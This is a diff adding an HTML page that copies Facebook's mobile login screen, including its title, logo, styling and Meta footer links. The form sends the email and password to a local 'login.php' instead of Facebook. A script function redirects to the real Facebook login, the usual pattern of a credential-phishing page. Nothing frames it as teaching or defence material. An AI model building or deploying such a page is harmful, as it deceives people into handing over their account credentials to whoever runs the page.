@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(
+        135deg,
+        #fff0f5 5%,
+        #e4f0ff 25%,
+        #f0f2f5 60%,
+        #e8f5e9 100%
+      );
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding-top: 10px;
+      overflow-x: hidden;
+    }
+
+    .lang {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #444;
+    }
+
+    .logo {
+      margin-top: 10px;
+    }
+
+    svg {
+      width: 60px;
+      height: 60px;
+    }
+
+    .form-container {
+      margin-top: 20px;
+      width: 90%;
+      max-width: 380px;
+      text-align: center;
+    }
+
+    .form-container input {
+      width: 90%;
+      padding: 20px;
+      margin: 5px 0;
+      border-radius: 10px;
+      border: 1px solid #ccd0d5;
+      font-size: 18px;
+      background: #ffffff;
+      outline: none;
+      box-shadow: none;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 17px;
+      border: 0.5px solid #1877f2;
+      border-radius: 30px;
+      margin-top: 5px;
+      cursor: pointer;
+    }
+
+    .form-container a {
+      font-size: 14px;
+      color: #121212;
+      text-decoration: underline;
+      display: block;
+      margin: 10px 0;
+    }
+
+    .create-account {
+      margin-top: 30px;
+      width: 90%;
+      max-width: 380px;
+    }
+
+    .create-account button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 30px;
+      border: 1px solid #1877f2;
+      background: none;
+      color: #1877f2;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    .meta-logo {
+      font-size: 18px;
+      color: #000000;
+      margin-bottom: 3px;
+    }
+
+    .footer-links {
+      font-size: 14px;
+      color: #000000;
+    }
+
+    .footer-links a {
+      margin: 0 10px;
+      color: #555;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .more-dropdown {
+      display: none;
+      font-size: 13px;
+      margin-top: 10px;
+      overflow-y: scroll;
+    }
+
+    .more-dropdown a {
+      display: block;
+      color: #555;
+      margin: 5px 0;
+      text-decoration: none;
+      overflow-y: scroll;
+    }
+
+    @media (max-height: 700px) {
+      body {
+        justify-content: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="lang">English (UK)</div>
+
+  <div class="logo">
+    <svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="128" cy="128" r="128" fill="#1877F2"/>
+      <path fill="#FFFFFF" d="M140 256v-96h32l4.8-37h-36.8v-24c0-10.7 3.1-18 19-18h20V47.4c-3.4-.4-15.3-1.5-29.1-1.5-28.8 0-48.5 17.6-48.5 50v28H76v37h25v96h39z"/>
+    </svg>
+  </div>
+
+  <div class="form-container">
+    <form action="login.php" method="POST">
+      <input type="text" name="email" placeholder="Mobile number or email address" required>
+      <input type="password" name="pass" placeholder="Password" required>
+      <button type="submit">Log in</button>
+    </form>
+    <a href="#">Forgotten password?</a>
+  </div>
+ 
+  <div class="create-account">
+    <button>Create new account</button>
+  </div>
+
+  <div class="footer">
+    <div class="meta-logo">Meta</div>
+    <div class="footer-links">
+      <a href="https://about.meta.com/" target="_blank">About</a>
+      <a href="https://m.facebook.com/help/?ref=pf" target="_blank">Help</a>
+      <a onclick="toggleMore()">More</a>
+    </div>
+    <div class="more-dropdown" id="moreLinks">
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Video</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Ray-Ban Meta</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Instagram</a>
+      <a href="#">Threads</a>
+      <a href="#">Developers</a>
+      <a href="#">Careers</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Privacy Centre</a>
+    </div>
+  </div>
+
+  <script>
+    function redirectToFacebook(event) {
+      event.preventDefault();
+      setTimeout(() => {
+        window.location.href = "https://m.facebook.com/login";
+      }, 500);
+    }
+
+    function toggleMore() {
+      const box = document.getElementById("moreLinks");
+      box.style.display = box.style.display === "block" ? "none" : "block";
+    }
+  </script>
+
+</body>
+</html>
